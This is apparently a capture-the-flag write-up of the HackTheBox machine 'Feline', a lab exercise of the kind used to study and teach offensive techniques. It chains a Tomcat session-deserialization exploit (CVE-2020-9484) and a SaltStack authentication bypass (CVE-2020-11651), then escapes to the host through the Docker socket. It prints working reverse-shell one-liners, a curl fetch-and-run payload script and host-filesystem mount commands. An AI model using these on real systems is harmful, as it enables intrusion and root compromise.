---
title: HTB: Feline
url: https://0xdf.gitlab.io/2021/02/20/htb-feline.html
date: 2021-02-20T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-feline, ctf, nmap, ubuntu, upload, tomcat, deserialization, java, cve-2020-9484, ysoserial, docker, saltstack, cve-2020-11651, chisel, docker-sock, container, socat, htb-fatty, htb-arkham
---

![Feline](https://0xdfimages.gitlab.io/img/feline-cover.png)

Feline was another Tomcat box, this time exploiting a neat CVE that allowed me to upload a malcious serialized payload and then trigger it by giving a cookie that points the session to that file. The rest of the box focuses on Salt Stack, an IT automation platform. My foothold shell is on the main host, but Salt is running in a container. I’ll exploit another CVE to get a shell in the Salt container, and then exploit that containers access to the docker socket to get root on the host. In Beyond Root, I’ll show an alternative way of interacting with the docker socket by uploading the docker binary, and I’ll look at the permissions on that socket and how it’s shared into the container.

## Box Info

| Name | [Feline](https://hackthebox.com/machines/feline)  [Feline](https://hackthebox.com/machines/feline) [Play on HackTheBox](https://hackthebox.com/machines/feline) |
| --- | --- |
| Release Date | [29 Aug 2020](https://twitter.com/hackthebox_eu/status/1299015092546174977) |
| Retire Date | 20 Feb 2021 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Feline |
| Radar Graph | Radar chart for Feline |
| First Blood User | 00:44:52[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 02:08:18[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creators | [MinatoTW MinatoTW](https://app.hackthebox.com/users/8308)  [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (8080):

```

root@kali# nmap -p- --min-rate 10000 10.10.10.205
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 21:48 EDT
Nmap scan report for 10.10.10.205
Host is up (0.017s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds

root@kali# nmap -p 22,8080 -sC -sV 10.10.10.205
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 21:49 EDT
Nmap scan report for 10.10.10.205
Host is up (0.014s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.27
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds

```

Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server), the host is likely running Ubuntu Focal 20.04.

The HTTP server on 8080 is Apache Tomcat version 9.0.27.

### Website - TCP 8080

The site is VirusBucket, what appears to be a [VirusTotal](https://www.virustotal.com/gui/home/search) knock-off:

![image-20200831215121528](https://0xdfimages.gitlab.io/img/image-20200831215121528.png)

All of the links point to this homepage, except for Service, which presents an upload form:

![image-20200831215233684](https://0xdfimages.gitlab.io/img/image-20200831215233684.png)

I can enter an email and clicking sample brings up the file selector. When I hit “Analyze!”, the page doesn’t refresh, but a message shows up below the button:

![image-20200831215606133](https://0xdfimages.gitlab.io/img/image-20200831215606133.png)

`gobuster` didn’t return anything other than `/images` and `/service` (which is the upload form above).

## Shell as tomcat

### Uploads

I spent a while trying to upload files to the site in the hopes that they might be run. I started with a Bash script that would call a reverse shell, then an ELF from `msfvenom`, a Python script, etc. Eventually I decided that my payload didn’t seem to be being run.

Submitting the file sends an HTTP POST request with the email as a GET parameter and the file as a form field in the POST:

```

POST /upload.jsp?email=0xdf@0xdf.htb HTTP/1.1
Host: 10.10.10.205:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.205:8080/service/
Content-Type: multipart/form-data; boundary=---------------------------196356314313815341281577268423
Origin: http://10.10.10.205:8080
Content-Length: 290
Connection: close
Cookie: JSESSIONID=11DB6C0E281EEC29EC6B0B3A50EEE9C3
-----------------------------196356314313815341281577268423
Content-Disposition: form-data; name="image"; filename="shell.sh"
Content-Type: application/x-shellscript

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.15/443 0>&1
-----------------------------196356314313815341281577268423--

```

Beside the content of the file, I control the email address (which is passed as a GET parameter even in this POST request) and the filename.

On sending the request to Burp Repeater, bad characters (like `"`) in the email address returns an HTTP 400 Bad Request. At the end of the HTML is this:

```

<pre>java.lang.IllegalArgumentException: Invalid character found in the request target. The valid characters are defined in RFC 7230 and RFC 3986
	org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:468)
	org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:292)
	org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
	org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:861)
	org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1579)
	org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	java.base&#47;java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	java.base&#47;java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	java.base&#47;java.lang.Thread.run(Thread.java:834)
</pre>
<p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" />
<h3>Apache Tomcat/9.0.27</h3>
</body>
</html>

```

It the bottom matches the version `nmap` returned.

Another thing that was useful was submitting with an empty filename:

[![image-20200831220455176](https://0xdfimages.gitlab.io/img/image-20200831220455176.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200831220455176.png)

It looks like the server is taking that name and prepending `/opt/samples/uploads` to it to create a filename, and when it’s blank, it can’t write a file where the directory already exists, so it throws an error.

I tried seeing if I could write up a directory with `../test`, but it returned an error message, `Invalid filename!`, which suggests some kind of filtering is going on. Quick tests show a bad character list that includes `/`, `-`, `|`, and a bunch of other special characters.

### Tomcat Patch Logs

The [Tomcat patched vulnerabilities list](https://tomcat.apache.org/security-9.html) shows the first security fix after 9.0.27 is in 9.0.29, which was released in November 2019. There have been seven updates that included a security fix since the version on Feline. Looking through all of those, I ignored the local bugs and the denial of service (DOS) bugs, leaving me to focus on three:
- **Moderate: Local Privilege Escalation** [CVE-2019-12418](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12418)
- **Important: AJP Request Injection and potential Remote Code Execution** [CVE-2020-1938](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938)
- **Remote Code Execution via session persistence** [CVE-2020-9484](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484)

The first one is local, but there’s another bug, [CVE-2019-2684](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2684) which allows it to be run remotely. Still, given that it’s a privesc, it seems unlikely to be the entry point to this box.

The second one, [CVE-2020-1938](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938), is focused on an exposed port for Apache JServ Protocol (AJP), which I haven’t seen here.

The last one is interesting.

### CVE-2020-9484

#### Background

CVE-2020-9484 is a [deserialization vulnerability](https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/) combined with a bit of a directory traversal in Apache Tomcat’s session handling. I covered this exploit in last year’s [Hackvent Day 21 write-up](/hackvent2020/leet#hv2021). Basically, when an HTTP request includes a `JSESSIONID` cookie, before this patch, the server would look for `[cookie].session` in the sessions folder (in this case `/opt/tomcat/session`, though it’s not important to know that to perform this attack). If I set the cookie to be `../../../../0xdf`, it will end up looking for `/0xdf.session` in the system root.

What’s inside the session file is a serialized Java object representing the state of the session.

If I can upload a malicious serialized payload, and then reference it with the session cookie, the server will deserialize the payload and provide RCE.

#### Payload / POC

I’ve used [YSoSerial](https://github.com/frohoff/ysoserial) before (see [Fatty](/2020/08/08/htb-fatty.html#ysoserial) and [Arkham](/2019/08/10/htb-arkham.html#jsf-deserialization-background)) to create malicious Java serialized payloads. I’ll use that here. It has a bunch of different payload options. What works will depend on how the target is configured. I’ve found it’s always best to start with `CommonsCollections` (there are five them).

I’ll start with a simple `ping` to myself to see if I can get RCE.

```

root@kali# java -jar /opt/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 'ping -c 1 10.10.14.15' > ping.session

```

Now I’ll upload that through the site, and, with `tcpdump` listening, send the attack:

```

root@kali# curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../opt/samples/uploads/ping"
<!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 – Internal Server Error</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> java.lang.Override missing element entrySet</p><p><b>Description</b> The server encountered an unexpected condition that prevented it from fulfilling the request.</p><p><b>Exception</b></p><pre>java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet
        java.base&#47;sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:83)
        com.sun.proxy.$Proxy5.entrySet(Unknown Source)
...[snip]...

```

It crashes, but I don’t get a ping. The crash is expected. The payload won’t have the data the program expects, and will make it crash. But not getting a ping means the payload didn’t work.

I’ll repeat the process with `CommonsCollections2`, and I do get a ping:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
09:46:24.215875 IP 10.10.10.205 > 10.10.14.15: ICMP echo request, id 1, seq 1, length 64
09:46:24.215931 IP 10.10.14.15 > 10.10.10.205: ICMP echo reply, id 1, seq 1, length 64

```

I have RCE, and know a payload that works.

#### Shell

To get a shell, I needed to do a bit more playing. It didn’t work with any commands that had redirection (like `|` or `>`) or stacking commands with `;`. So I went to the three step approach. I created a simple shell payload Bash script:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.15/443 0>&1

```

Now I’ll send three payloads. The first will use `curl` to fetch that shell and write it to `/tmp`. The next will `chmod` it to make it executable. The third will run it. Because I ended up doing this a handful of times, I wrote a dummy Bash script to do it for me.

```

#!/bin/bash

ip=$(ip addr | grep "inet 10.10" | awk '{print $2}' | cut -d'/' -f1)
echo -e "#!/bin/bash\n\nbash -i >& /dev/tcp/${ip}/443 0>&1" > payload.sh

java -jar /opt/ysoserial/ysoserial-master.jar CommonsCollections2 "curl ${ip}/payload.sh -o /tmp/.0xdf" > payload.session
curl -s 'http://10.10.10.205:8080/upload.jsp?email=abcd' -F 'image=@./payload.session' -x http://127.0.0.1:8080 > /dev/null
curl -s http://10.10.10.205:8080/service/ -H "Cookie: JSESSIONID=../../../../../../opt/samples/uploads/payload" > /dev/null

java -jar /opt/ysoserial/ysoserial-master.jar CommonsCollections2 'chmod +x /tmp/.0xdf' > payload.session                
curl -s 'http://10.10.10.205:8080/upload.jsp?email=abcd' -F 'image=@./payload.session' -x http://127.0.0.1:8080 > /dev/null
curl -s http://10.10.10.205:8080/service/ -H "Cookie: JSESSIONID=../../../../../../opt/samples/uploads/payload" > /dev/null

java -jar /opt/ysoserial/ysoserial-master.jar CommonsCollections2 '/tmp/.0xdf' > payload.session                         
curl -s 'http://10.10.10.205:8080/upload.jsp?email=abcd' -F 'image=@./payload.session' -x http://127.0.0.1:8080 > /dev/null
curl -s http://10.10.10.205:8080/service/ -H "Cookie: JSESSIONID=../../../../../../opt/samples/uploads/payload" > /dev/null   

```

I’ll start `python3 -m http.server 80` in the directory with `shell.sh`, and a `nc` listener on port 443, then run the above Bash script. First I see the hit on my webserver:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.205 - - [31/Aug/2020 16:45:16] "GET /payload.sh HTTP/1.1" 200 -  

```

Then there’s a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.205.
Ncat: Connection from 10.10.10.205:42124.
bash: cannot set terminal process group (944): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@VirusBucket:/opt/tomcat$

```

I’ll use `python -c 'import pty;pty.spawn("bash")'` then Ctrl-z, `stty raw -echo; fg`, `reset` to get a better shell, and then grab `user.txt`:

```

tomcat@VirusBucket:~$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
tomcat@VirusBucket:~$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
root@kali$ stty raw -echo; fg
sudo nc -lnvp 443
                 reset
reset: unknown terminal type unknown
Terminal type? screen
tomcat@VirusBucket:~$ 
tomcat@VirusBucket:~$ cat user.txt
1f07a492************************

```

## Shell as root in container

### Enumeration

Looking around the box, the home directory was basically empty. The box also limited the process list to processes that were being run by the current user, so there wasn’t much there. What got me going in the right direction was looking at the `netstat`:

```

tomcat@VirusBucket:~$ netstat -tnl 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:35217         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN     
tcp6       0      0 :::8080                 :::*                    LISTEN

```

There were several ports listening on localhost only. Ports 4505 and 4506 are associated with [SaltStack](https://www.saltstack.com/), an infrastructure automation platform.

I also noted that this box has multiple interfaces, including a `docker0`, which in HTB indicates containers:

```

tomcat@VirusBucket:~$ ifconfig                     
br-e9220f64857c: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:cb:c9:0f:ce  txqueuelen 0  (Ethernet) 
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:75ff:fea3:764d  prefixlen 64  scopeid 0x20<link>
        ether 02:42:75:a3:76:4d  txqueuelen 0  (Ethernet) 
        RX packets 5354  bytes 822803 (822.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9339  bytes 635261 (635.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.205  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:5e24  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:5e24  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:5e:24  txqueuelen 1000  (Ethernet)
        RX packets 110193  bytes 49169059 (49.1 MB)
        RX errors 0  dropped 96  overruns 0  frame 0
        TX packets 106878  bytes 13658308 (13.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
...[snip]...

```

This shell seems to be running on the main host.

### CVE-2020-11651

#### Background

Googling for “SaltStack vulnerabilities” returned [this article](https://www.helpnetsecurity.com/2020/05/04/saltstack-salt-vulnerabilities/) from May 2020 (around the same time as the Tomcat vulnerability) talking about CVE-2020-11651 and CVE-2020-11652 which can be exploited by remote, unauthenticated attackers.

> According to the researchers, the vulnerabilities allow attackers to “connect to the ‘request server’ port to bypass all authentication and authorization controls and publish arbitrary control messages, read and write files anywhere on the ‘master’ server filesystem and steal the secret key used to authenticate to the master as root.”

More Google led to [this proof of concept](https://github.com/jasperla/CVE-2020-11651-poc) on GitHub.

#### Tunnel

To access these ports, I need to run from Feline or tunnel. I uploaded [Chisel](https://github.com/jpillora/chisel) to Feline and used it to create a socks proxy. First I started the server on my host:

```

root@kali:/opt/chisel# ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
2020/09/01 09:15:49 server: Reverse tunnelling enabled
2020/09/01 09:15:49 server: Fingerprint be:f7:9d:b2:7f:8c:a4:60:51:43:9a:c3:3e:b1:34:fa
2020/09/01 09:15:49 server: Listening on 0.0.0.0:8000...

```

Next the client:

```

tomcat@VirusBucket:/var/tmp$ ./chisel_1.6.0_linux_amd64 client 10.10.14.15:8000 R:socks
2020/09/01 17:03:56 client: Connecting to ws://10.10.14.15:8000
2020/09/01 17:03:56 client: Fingerprint be:f7:9d:b2:7f:8c:a4:60:51:43:9a:c3:3e:b1:34:fa
2020/09/01 17:03:56 client: Connected (Latency 11.653786ms)

```

The server shows this connection:

```

2020/09/01 09:20:02 server: proxy#1:R:127.0.0.1:1080=>socks: Listening

```

#### Test Vulnerable

Running the script with no arguments does a check on localhost to see if it’s vulnerable. I’ll use `proxychains` to tunnel through the Chisel socks proxy. The proxies in `/etc/proxychains.conf` tell it to use 127.0.0.1:1080 as a socks5 proxy:

```

[ProxyList]
socks5  127.0.0.1 1080

```

Now I’ll run the exploit with `proxychains`:

```

root@kali:/opt/CVE-2020-11651-poc# proxychains python3 exploit.py
ProxyChains-3.1 (http://proxychains.sf.net)
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: HWxqacQWZGow8QrRBTcMKALAYRqsdT2t30kwsV8MBIYk03o/4UV8puHk788hKPT4mPdRg55WyEI=

```

Feline is vulnerable.

#### Ping

Next I tried to get it to ping me by running:

```

root@kali:/opt/CVE-2020-11651-poc# proxychains python3 exploit.py --exec 'ping -c 1 10.10.14.15'
ProxyChains-3.1 (http://proxychains.sf.net)
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: HWxqacQWZGow8QrRBTcMKALAYRqsdT2t30kwsV8MBIYk03o/4UV8puHk788hKPT4mPdRg55WyEI=
[+] Attempting to execute ping -c 1 10.10.14.15 on 127.0.0.1
[+] Successfully scheduled job: 20200901193401749722

```

At `tcpdump`, I got the ping:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
15:32:16.127560 IP 10.10.10.205 > 10.10.14.15: ICMP echo request, id 9630, seq 1, length 64
15:32:16.127615 IP 10.10.14.15 > 10.10.10.205: ICMP echo reply, id 9630, seq 1, length 6

```

#### Shell

I’ll just change the command to a reverse shell:

```

root@kali:/opt/CVE-2020-11651-poc# proxychains python3 exploit.py --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"'
ProxyChains-3.1 (http://proxychains.sf.net)
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: HWxqacQWZGow8QrRBTcMKALAYRqsdT2t30kwsV8MBIYk03o/4UV8puHk788hKPT4mPdRg55WyEI=
[+] Attempting to execute bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1" on 127.0.0.1
[+] Successfully scheduled job: 20200901193454581517

```

At `nc`, I get a shell as root in a container:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.205.
Ncat: Connection from 10.10.10.205:39680.
bash: cannot set terminal process group (9655): Inappropriate ioctl for device
bash: no job control in this shell
root@2d24bf61767c:~# id
uid=0(root) gid=0(root) groups=0(root)

```

## Shell as root

### Enumeration

In the root home directory, there’s a `todo.txt`:

```
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.

```

That’s interesting, but it doesn’t mean a ton to me. They are looking to use events to spawn docker containers.

The breakthrough came on looking at the Bash history:

```

root@2d24bf61767c:~# cat .bash_history 
paswd
passwd
passwd
passswd
passwd
passwd
cd /root
ls
ls -la
rm .wget-hsts 
cd .ssh/
ls
cd ..
printf '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cd /home/tomcat
cat /etc/passwd
exit
cd /root/
ls
cat todo.txt 
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
exit

```

The interesting line is the last thing run. That `curl` is hitting the [Docker API](https://docs.docker.com/engine/api/v1.30/). If I can interact with the API from here, it is basically like being in the `docker` group, which means I can get file system access as root to the docker host, which typically leads to a shell.

I’ll run the command from the history, and it works:

```

root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1590787186,"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e","Labels":null,"ParentId":"","RepoDigests":null,"RepoTags":["sandbox:latest"],"SharedSize":-1,"Size":5574537,"VirtualSize":5574537},{"Containers":-1,"Created":1588544489,"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9","Labels":null,"ParentId":"","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1056679100,"VirtualSize":1056679100}]

```

This command it basically the equivalent of running `docker ps`.

### Strategy

The next step is to start a container with the root files system mapped into it and then to run commands in that container getting access to the root file system.

The challenge here is just reading the [API docs](https://docs.docker.com/engine/api/v1.30/) and figuring out which to use and what parameters are required.

I found three strategies that worked:
1. Command set at container creation:
   - Create a container with the host filesystem mapped into it and a command;
   - Start the container;
   - Get command results from Docker logs;
2. Container with `exec`:
   - Create a container;
   - Start the container;
   - Create an `exec` instance;
   - Start `exec` instance;
3. Container + `socat` = shell:
   - Create a container;
   - Start the container;
   - Attach `socat` to the container to get a shell

### Run Commands w/ Host FS [Method #1]

#### Create Container

I’ll start with the `/container/create` [API call](https://docs.docker.com/engine/api/v1.30/#operation/ContainerCreate). It takes a POST, with a ton of potential arguments. I had to play around with this a bunch to get something that worked, but the command I ended up using was:

```

root@2d24bf61767c:~# curl --unix-socket /var/run/docker.sock -s -X 'POST' -H 'Content-Type: application/json' --data-binary '{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "ls -l /rootfs/root/"], "Tty": true}' http://localhost/containers/create
{"Id":"0af5539d4b1cf764a116301fb13938cb361cd0386b6fbc4fb750661d1d226b36","Warnings":[]}

```

It returns the ID of the new container without any warnings, so it worked.

The POST body is:

```

{
  "Image": "sandbox:latest",
  "HostConfig": {
    "Binds": [
      "/:/rootfs"
    ]
  },
  "Cmd": [
    "/bin/sh",
    "-c",
    "ls -l /rootfs/root/"
  ],
  "Tty": true
}

```

The `Image` comes from the list of available containers above. The `Binds` tells the container to map the host `/` to `/rootfs` inside the container. To start, I’ll use `Cmd` to list the files in the root home directory. For some reason I needed to set `Tty` to `true` to get this working.

#### Start Container

Next I’ll use the `/container/$id/start` [API](https://docs.docker.com/engine/api/v1.30/#operation/ContainerStart) to start the container (I can use the full ID or the first four characters):

```

root@2d24bf61767c:~# curl -i --unix-socket /var/run/docker.sock -s -X POST -H "Content-Type: application/json" http://localhost/containers/0af5/start
HTTP/1.1 204 No Content
Api-Version: 1.40
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.8 (linux)
Date: Tue, 01 Sep 2020 20:36:10 GMT

```

I included `-i` to see the headers. HTTP 204 is the expected code when the container starts.

#### Get Results

At this point, the `Cmd` has already run. I’ll use the `/containers/$id/logs` [API](https://docs.docker.com/engine/api/v1.30/#operation/ContainerLogs):

```

root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/0af5/logs?stderr=1&stdout=1"total 8
-rw-------    1 root     root            33 Sep  1 13:19 root.txt
drwxr-xr-x    3 root     root          4096 May 18 08:44 snap

```

I’ll set both `stderr` and `stdout` to 1 to requests both, and then the results come back showing the contents of `/root`!

#### One-Liner

To play with this, I generated the following one-liner so that I could just push up-arrow, change the command, and then hit enter and get results:

```

root@2d24bf61767c:~# id=$(curl --unix-socket /var/run/docker.sock -s -X 'POST' -H 'Content-Type: application/json' --data-binary '{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "ls -l /rootfs/root/"], "Tty": true}' http://localhost/containers/create | cut -d'"' -f4); curl --unix-socket /var/run/docker.sock -s -X POST -H "Content-Type: application/json" http://localhost/containers/${id}/start; curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/${id}/logs?stderr=1&stdout=1"
total 8
-rw-------    1 root     root            33 Sep  1 13:19 root.txt
drwxr-xr-x    3 root     root          4096 May 18 08:44 snap

```

From here I can grab `root.txt` by just changing the command:

```

root@2d24bf61767c:~# id=$(curl --unix-socket /var/run/docker.sock -s -X 'POST' -H 'Content-Type: application/json' --data-binary '{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "cat /rootfs/root/root.txt"], "Tty": true}' http://localhost/containers/create | cut -d'"' -f4); curl --unix-socket /var/run/docker.sock -s -X POST -H "Content-Type: application/json" http://localhost/containers/${id}/start; curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/${id}/logs?stderr=1&stdout=1"
24d5f49db9f24f6e87b35ebe1c53e796

```

### Run Commands w/ Host FS [Method #2]

This box seems to be clearing out containers every few minutes. Because of that, I preferred to use the above method to just create a new container each command. That said, in an engagement where OPSEC mattered more, I’d create one instance, and then run commands using the `exec` [API](https://docs.docker.com/engine/api/v1.30/#tag/Exec).

The first two steps are the same - create and start an instance. This time, I’ll create it without the `Cmd` parameter:

```

root@2d24bf61767c:~# id=$(curl --unix-socket /var/run/docker.sock -s -X 'POST' -H 'Content-Type: application/json' --data-binary '{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Tty": true}' http://localhost/containers/create | cut -d'"' -f4); curl --unix-socket /var/run/docker.sock -s -X POST -H "Content-Type: application/json" http://localhost/containers/${id}/start

```

Now I’ll add a command, which will return an ID:

```

curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Cmd": ["ls", "-l", "/rootfs/root/"], "AttachStdout": true, "AttachStderr": true, "Tty": true}' http://localhost/containers/${id}/exec
{"Id":"f55b2c9d029f0588d615cbb3d4b04e2aaf1ae4438cabfa1122643ece406c4ecc"}

```

This ID is not the container ID, but the exec ID. I’ll use the `start` option to run the command and print the results:

```

root@2d24bf61767c:~# curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" http://localhost/exec/f55b2c9d029f0588d615cbb3d4b04e2aaf1ae4438cabfa1122643ece406c4ecc/start -d '{"Detach": false, "Tty": true}'
total 8
-rw-------    1 root     root            33 Sep  1 13:19 root.txt
drwxr-xr-x    3 root     root          4096 May 18 08:44 snap

```

### Socat Shell in Container w/ Host FS [Method #3]

[This blog post](https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html) shows how to hook socat into the socket to get an ugly shell in the new container. Just like before, I’ll create and start a container, this time with some extra parameters. The blog recommends storing them in a `container.json` file, so I’ll do that. Pretty printed it looks like (though the real file doesn’t have the newlines or spacing):

```

{
  "Image": "sandbox:latest",
  "Cmd": [
    "/bin/sh"
  ],
  "DetachKeys": "Ctrl-p,Ctrl-q",
  "OpenStdin": true,
  "Mounts": [
    {
